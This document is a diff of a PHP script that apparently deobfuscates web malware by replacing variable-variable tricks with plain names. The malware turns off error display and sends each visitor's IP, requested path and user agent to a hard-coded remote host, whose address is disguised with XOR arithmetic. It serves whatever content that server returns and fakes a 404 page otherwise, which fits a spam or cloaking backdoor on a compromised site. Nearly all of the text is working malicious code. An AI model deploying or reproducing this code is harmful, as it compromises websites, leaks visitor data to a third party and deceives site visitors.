@@ -37,9 +37,7 @@ ini_set("display_errors", 0);
 $wrlmzibel = "key";
 $qsrgfqqt = "path";
 $ymetmsampeo = "key";
-$ {
-    $ymetmsampeo
-} = 0;
+$key = 0;
 $msbqwlmlaajm = "key";
 $aujkdfbhpz = "query";
 $i = 0;
@@ -49,69 +47,45 @@ $tkckivsitj = "ip";
 foreach (str_split($_SERVER["REQUEST_URI"]) as $letter) {
     $rptcjic = "i";
     $key+= ord($letter);
-    $ {
-        $rptcjic
-    }
+    $i
     ++;
 }
 $ilqsxkyeof = "query";
 if (!($i / 10)) {
     $pfhzdkdejv = "i";
-    $ {
-        $pfhzdkdejv
-    }
+    $i
     ();
     exit();
 }
 $key^= $key;
 $key+= 32;
-$key = str_repeat(chr($ {
-    $wrlmzibel
-}), 8);
+$key = str_repeat(chr($key), 8);
 function error_404() {
     $uiugkiu = "content";
     $luxtfimjdqc = "uri";
     $ucpgdjtmd = "uri";
     header("HTTP/1.1 404 Not Found");
-    $ {
-        $luxtfimjdqc
-    } = preg_replace("/(\?).*\$/", "", $_SERVER["REQUEST_URI"]);
-    $ {
-        $uiugkiu
-    } = http_request_custom("http://" . $_SERVER["SERVER_NAME"] . "/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA");
+    $uri = preg_replace("/(\?).*\$/", "", $_SERVER["REQUEST_URI"]);
+    $content = http_request_custom("http://" . $_SERVER["SERVER_NAME"] . "/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA");
     $content = str_replace("/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA", $uri, $content);
     exit($content);
 }
 $fdfuftjvmxho = "query";
-$ {
-    $umfbxhduyo
-} = "125.89.44.28";
+$ip = "125.89.44.28";
 $port = "80";
 $path = "/fdn/entry.php";
 $query = array();
-$ {
-    $ckrieemlnceu
-}
+$query
 ["ip"] = getIp();
-$ {
-    $ilqsxkyeof
-}
+$query
 ["path"] = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 $query
 ["useragent"] = getUseragent();
 $lldbkxymxva = "content";
 $url = "http://" . convertIpToString(1048202089 ^ (ord($key
 [0]) + ord($key
-[1]) + (strstr(substr($_SERVER["REQUEST_URI"], -4), ".php") == FALSE ? 65 : ip2long($ {
-    $tkckivsitj
-})))) . ":" . $port . $ {
-    $qsrgfqqt
-} . "?" . http_build_query($ {
-    $aujkdfbhpz
-});
-$content = @file_get_contents($ {
-    $shacohpm
-});
+[1]) + (strstr(substr($_SERVER["REQUEST_URI"], -4), ".php") == FALSE ? 65 : ip2long($ip)))) . ":" . $port . $path . "?" . http_build_query($query);
+$content = @file_get_contents($url);
 if (strlen($content) < 10) {
     error_404();
 }
@@ -135,13 +109,9 @@ function http_request_custom($params) {
     $cnfczslct = "params";
     $fkvqdn = "params";
     $yzjtoosg = "params";
-    if (!is_array($ {
-        $tjtjrwr
-    })) {
+    if (!is_array($params)) {
         $zxyvbpjxp = "params";
-        $params = array("url" => $ {
-            $zxyvbpjxp
-        }, "method" => "GET");
+        $params = array("url" => $params, "method" => "GET");
     }
     if ($params
     ["url"] == "") return FALSE;
@@ -166,18 +136,14 @@ function http_request_custom($params) {
     ["scheme"])) $url
     ["scheme"] = "http";
     $auldfyydkj = "params";
-    if (!isset($ {
-        $gicietxh
-    }
+    if (!isset($url
     ["path"])) $url
     ["path"] = "/";
     $vguewdxf = "url";
     $vmkoxrpjp = "url";
     $gfzboemo = "url";
     if (!isset($url
-    ["host"]) && isset($ {
-        $qotcrhqwshc
-    }
+    ["host"]) && isset($url
     ["path"])) {
         $nawcefz = "url";
         if (strpos($url
@@ -185,9 +151,7 @@ function http_request_custom($params) {
             $wvtbrpn = "url";
             $rvbinxvez = "url";
             $url
-            ["host"] = substr($ {
-                $rvbinxvez
-            }
+            ["host"] = substr($url
             ["path"], 0, strpos($url
             ["path"], "/"));
             $url
@@ -228,9 +192,7 @@ function http_request_custom($params) {
     ["scheme"] == "https" ? "ssl://" : "";
     $fp = @fsockopen($scheme . $url
     ["host"], $port, $errno, $errstr, $timeout);
-    if ($ {
-        $jriwgsxtqd
-    }) {
+    if ($fp) {
         $svlazhobbp = "request";
         $lhmpwoc = "params";
         $gdwfgcsx = "fp";
@@ -241,13 +203,9 @@ function http_request_custom($params) {
         $wviokvmo = "request";
         $csmjkpsz = "request";
         $umehuhqj = "params";
-        $ {
-            $wviokvmo
-        } = "{$params['method']} {$url['path']} HTTP/1.0
+        $request = "{$params['method']} {$url['path']} HTTP/1.0
 ";
-        $ {
-            $svlazhobbp
-        }.= "Host: {$url['host']}
+        $request.= "Host: {$url['host']}
 ";
         $request.= "User-Agent: {$params['User-Agent']}" . "
 ";
@@ -268,26 +226,16 @@ function http_request_custom($params) {
                 $vrpunkqg = "cookie";
                 $jblkqpvxi = "k";
                 foreach ($params
-                ["cookie"] as $k => $ {
-                    $ilfymkecn
-                }) $cookie.= "$k=$v; ";
-                $cookie = substr($ {
-                    $xjvporljfqln
-                }, 0, -2);
-            } else $ {
-                $loxiwzyrttq
-            } = $params
+                ["cookie"] as $k => $v) $cookie.= "$k=$v; ";
+                $cookie = substr($cookie, 0, -2);
+            } else $cookie = $params
             ["cookie"];
             if ($cookie != "") $request.= "Cookie: $cookie
 ";
         }
-        $ {
-            $uqmgpukc
-        }.= "Connection: close
+        $request.= "Connection: close
 ";
-        if ($ {
-            $awdvdfigpf
-        }
+        if ($params
         ["method"] == "POST") {
             $whyvopvar = "request";
             $dxhxibkh = "request";
@@ -295,9 +243,7 @@ function http_request_custom($params) {
             $ysydczpdsymq = "data";
             $jpfvolh = "params";
             if (isset($params
-            ["data"]) && is_array($ {
-                $gvqvkczc
-            }
+            ["data"]) && is_array($params
             ["data"])) {
                 $rlssuhyc = "data";
                 $akosdbwayd = "v";
@@ -305,25 +251,15 @@ function http_request_custom($params) {
                 $mxpleejeka = "data";
                 $tilcymtxlv = "k";
                 foreach ($params
-                ["data"] AS $k => $v) $data.= urlencode($k) . "=" . urlencode($ {
-                    $akosdbwayd
-                }) . "&";
-                if (substr($data, -1) == "&") $ {
-                    $yggwowxhcyv
-                } = substr($ {
-                    $mxpleejeka
-                }, 0, -1);
+                ["data"] AS $k => $v) $data.= urlencode($k) . "=" . urlencode($v) . "&";
+                if (substr($data, -1) == "&") $data = substr($data, 0, -1);
             }
-            $ {
-                $ysydczpdsymq
-            }.= "
+            $data.= "
 
 ";
             $request.= "Content-type: application/x-www-form-urlencoded
 ";
-            $ {
-                $dxhxibkh
-            }.= "Content-length: " . strlen($data) . "
+            $request.= "Content-length: " . strlen($data) . "
 ";
         }
         $request.= "
@@ -340,12 +276,8 @@ function http_request_custom($params) {
             $rdlxopp = "h_detected";
             $mqvktloy = "fp";
             $sxhqtjymto = "res";
-            $res.= @fread($ {
-                $mqvktloy
-            }, 1024);
-            if (!$ {
-                $rdlxopp
-            } && strpos($res, "
+            $res.= @fread($fp, 1024);
+            if (!$h_detected && strpos($res, "
 
 ") !== FALSE) {
                 $nemplhw = "params";
@@ -362,27 +294,19 @@ function http_request_custom($params) {
                 if ($params
                 ["return"] == "headers" || $params
                 ["return"] == "array" || (isset($params
-                ["redirect"]) && $ {
-                    $nemplhw
-                }
+                ["redirect"]) && $params
                 ["redirect"] == true)) {
                     $hdhftqjfibi = "k";
                     $ugyhamhc = "headers";
                     $h = explode("
 ", $headers);
-                    $ {
-                        $ugyhamhc
-                    } = array();
-                    foreach ($h as $ {
-                        $hdhftqjfibi
-                    } => $v) {
+                    $headers = array();
+                    foreach ($h as $k => $v) {
                         $nuhksf = "v";
                         if (strpos($v, ":")) {
                             $fgebfn = "v";
                             $k = substr($v, 0, strpos($v, ":"));
-                            $v = trim(substr($ {
-                                $fgebfn
-                            }, strpos($v, ":") + 1));
+                            $v = trim(substr($v, strpos($v, ":") + 1));
                         }
                         $headers
                         [strtoupper($k) ] = $v;
@@ -390,25 +314,19 @@ function http_request_custom($params) {
                 }
                 $soprnmivykr = "params";
                 $lwipds = "params";
-                if (isset($ {
-                    $soprnmivykr
-                }
+                if (isset($params
                 ["redirect"]) && $params
                 ["redirect"] == true && isset($headers
                 ["LOCATION"])) {
                     $lhebulmdexg = "params";
                     $auaydcdvncw = "params";
-                    $ {
-                        $auaydcdvncw
-                    }
+                    $params
                     ["url"] = $headers
                     ["LOCATION"];
                     if (!isset($params
                     ["redirect-count"])) $params
                     ["redirect-count"] = 0;
-                    if ($ {
-                        $lhebulmdexg
-                    }
+                    if ($params
                     ["redirect-count"] < 10) {
                         $kxqoyvql = "params";
                         $params
@@ -419,15 +337,11 @@ function http_request_custom($params) {
                         ($params);
                     }
                 }
-                if ($ {
-                    $lwipds
-                }
+                if ($params
                 ["return"] == "headers") return $headers;
             }
         }
-        @fclose($ {
-            $gdwfgcsx
-        });
+        @fclose($fp);
     } else return FALSE;
     if ($params
     ["return"] == "array") $res = array("headers" => $headers, "content" => $res);
